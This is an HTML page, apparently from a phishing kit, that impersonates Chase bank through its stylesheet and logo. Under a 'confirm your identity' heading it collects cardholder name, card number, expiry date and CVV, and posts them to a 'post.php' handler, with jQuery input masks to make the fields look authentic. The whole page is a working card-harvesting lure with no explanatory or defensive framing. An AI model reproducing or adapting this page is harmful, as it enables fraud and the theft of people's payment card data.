<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport"
		content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/chase.css">
    <title></title>
</head>
<body>

<header>
        <img src="res/img/logo.svg">
    </header>


<section>
   <div class="Container">

   <div class="colm">
    
    
      <div class="colm">
        <h2>confirm your identity</h2>
        <p>Confirm your identity by entering your card information.</p>
      </div>
      </div>

      <form action="post.php" method="post">
        
        <div class="box">
          <label>cardholder name</label>
        <input type="text" name="name" >
        </div>
      

        <div class="box">
          <div><label>Card number</label></div>
        <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
        </div>

        <div class="box">
          <label>Expiration date</label>
        <input type="text" name="exp" required placeholder="MM/AA" id="exp">
        </div>

        <div class="box">
          <label>security code</label>
        <input type="password" name="cvv" required placeholder="CVV" id="cvv">
        </div>

        <div class="box">
          <button type="sumbit">Continue</button>
        </div>
</form>
 
 



      </div>









    </div>













</section>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
</body>
</html>